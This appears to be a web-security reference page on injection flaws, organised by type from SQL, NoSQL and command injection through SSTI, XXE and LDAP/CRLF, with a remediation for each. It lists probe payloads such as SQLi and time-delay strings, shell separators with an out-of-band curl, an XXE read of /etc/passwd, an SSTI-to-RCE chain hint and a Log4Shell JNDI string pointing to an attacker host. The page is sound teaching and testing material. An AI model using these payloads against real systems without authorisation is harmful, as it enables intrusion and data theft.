# Injection (A05:2025)

Untrusted input crosses into an interpreter (SQL engine, shell, template, XML parser, LDAP directory)
and changes the *structure* of a command instead of being treated as data. The root cause is always
the same — **mixing code and data** — so the fix is always the same family: **parameterize / separate
the two.** CWE-89, CWE-78, CWE-94, CWE-90, CWE-643, CWE-1336, CWE-611.

> XSS is injection into the browser; it has its own leaf — [xss.md](xss.md).

## Find the entry→sink pairs first

Injection only exists where **input** reaches a **sink**. Enumerate both:
- Inputs: query/body/path params, headers, cookies, file names, webhook payloads, imported data.
- Sinks (grep): SQL string-building, `exec/system/spawn`, `eval/Function`, template render with user
  data, XML parse, LDAP filter build, redirect/header writes.
```bash
rg -n "SELECT .*(\+|\$\{|%s|format|f\")" .                 # SQL concatenation
rg -n "exec\(|execSync|child_process|os\.system|subprocess|Runtime\.exec|`.*\$\{" .   # command
rg -n "render_template_string|Template\(|{{.*}}|eval\(|new Function" .                 # template/eval
rg -n "DocumentBuilder|etree\.parse|libxml|XMLReader" .                               # XXE
```

---

## SQL injection (SQLi)

**Find:** inject a syntax-breaking char into each param and watch for errors/behavior change: `'`,
`"`, `')`, `--`. Then test boolean (`' OR '1'='1` vs `' AND '1'='2`), and time-based blind
(`'; WAITFOR DELAY '0:0:5'--`, `' OR SLEEP(5)--`, `|| pg_sleep(5)`). Use `sqlmap` to confirm/automate
*after* a manual signal (and only in scope).

**Confirm (non-destructive):** prove you control the query without dumping data — e.g. a boolean
oracle (page differs for true vs false condition) or a controlled time delay. For a PoC, reading
`version()`/`current_user` is plenty; never `DROP`/`UPDATE` on a target you don't own.

**Types:** in-band (error/UNION-based), blind (boolean/time), out-of-band (DNS/HTTP exfil for
no-feedback cases). Also **second-order** (input stored, then used unsafely later).

**Fix:**
```python
# ❌ db.execute(f"SELECT * FROM users WHERE email = '{email}'")
# ✅ parameterized — driver separates code from data
db.execute("SELECT * FROM users WHERE email = %s", (email,))
```
Parameterized queries / prepared statements everywhere; use an ORM correctly (avoid raw-string
helpers); allowlist for identifiers that can't be bound (table/column/`ORDER BY`); least-privilege DB
user. Input validation is defense-in-depth, **not** the primary control.

---

## NoSQL injection

**Find:** operator injection in JSON bodies/params — `{"username": {"$ne": null}}`,
`{"$gt": ""}`, `{"password": {"$regex": "^a"}}` to brute char-by-char; JS injection in `$where`.

**Fix:** validate types (reject objects where a string is expected), cast inputs, use the driver's
parameterization, disable server-side JS (`$where`/`mapReduce`), schema-validate (e.g. Mongoose with
strict types).

---

## OS command injection

**Find:** any feature that shells out (ping, image conversion, PDF gen, git ops, archive handling).
Inject command separators: `; id`, `| id`, `&& id`, `` `id` ``, `$(id)`, newline. Blind → time
(`; sleep 5`) or OOB (`; curl http://<oob>`).

**Fix:** **don't call the shell with user input.** Use the language API or `execFile`/`subprocess.run([...],
shell=False)` with an argument array (no shell parsing). If a binary is unavoidable, strict allowlist
of values, never concatenate.
```js
// ❌ exec(`convert ${file} out.png`)
// ✅ execFile('convert', [file, 'out.png'])   // no shell, args are data
```

---

## Server-Side Template Injection (SSTI)

**Find:** user input rendered *as a template* (Jinja2, Twig, Freemarker, Velocity, Handlebars, ERB,
Thymeleaf). Probe with `${7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>` — a returned `49` means the
template engine evaluated it. SSTI frequently escalates to **RCE** via engine internals.

**Fix:** never pass user input as the template; pass it as **data/context** to a fixed template. Use a
logic-less/sandboxed engine; disable dangerous globals. (See also [xss.md](xss.md) for client-side
template injection.)

---

## XXE (XML External Entity)

**Find:** any XML input (SOAP, SVG, DOCX/XLSX, SAML, `Content-Type: application/xml`). Inject a doctype
with an external entity to read a file or trigger SSRF:
```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]> <r>&x;</r>
```
Blind XXE → OOB exfil via a parameter entity to your collaborator.

**Fix:** disable DTDs/external entities in the parser (`FEATURE_SECURE_PROCESSING`,
`disallow-doctype-decl`, `resolve_entities=False`, `libxml_disable_entity_loader`). Prefer JSON; if XML
is required, harden every parser. CWE-611.

---

## LDAP / XPath / header (CRLF) / log injection (briefly)

- **LDAP:** inject `*)(uid=*))(|(uid=*` into auth filters → bypass. Fix: escape per RFC 4515 / use
  parameterized filters.
- **XPath:** `' or '1'='1` into XPath queries over XML user stores. Fix: parameterized XPath / escape.
- **CRLF / header injection:** `%0d%0a` into values reflected in headers → response splitting, cookie
  injection, cache poisoning. Fix: strip CR/LF, use framework header APIs.
- **Log injection:** newlines/control chars into logged input → forged log lines, or stored XSS in a
  log viewer. Fix: encode/escape before logging; structured logging.

## CTF angle

SQLi (UNION to read a `flag`/`users` table, `WAF`-bypass with comments/encoding), SSTI→RCE (Jinja2
`{{ ''.__class__.__mro__... }}` to reach `os.popen`), command injection in a "tools" web app, and XXE
file-read are staples. Recognize the engine, then reach for the known escalation chain.

## Real-world cases

- **Log4Shell (CVE-2021-44228, 2021)** — a JNDI lookup string like `${jndi:ldap://attacker/x}` placed
  in *any logged* user input (User-Agent, headers, chat messages) made Log4j fetch and execute remote
  code → unauthenticated RCE across the internet. Lesson: untrusted input reaching a lookup/expression
  evaluator *is* injection, even when the "sink" is just a logger.
  [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).
- **Disclosed reports:** [TOP SQLi](https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPSQLI.md)
  · [TOP RCE](https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPRCE.md)
  · [TOP SSTI](https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPSSTI.md) on HackerOne.

## References

[OWASP A05:2025](https://owasp.org/Top10/2025/) · [WSTG-INPV](https://owasp.org/www-project-web-security-testing-guide/) ·
CWE-[89](https://cwe.mitre.org/data/definitions/89.html)/[78](https://cwe.mitre.org/data/definitions/78.html)/[94](https://cwe.mitre.org/data/definitions/94.html)/[611](https://cwe.mitre.org/data/definitions/611.html)/[90](https://cwe.mitre.org/data/definitions/90.html)/[643](https://cwe.mitre.org/data/definitions/643.html) ·
OWASP [Injection](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html) / [SQLi](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) / [Query Parameterization](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html) Cheat Sheets ·
[PortSwigger: SQLi](https://portswigger.net/web-security/sql-injection) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). Full bibliography: [research/web.md](../../research/web.md). Back to [web/](README.md).
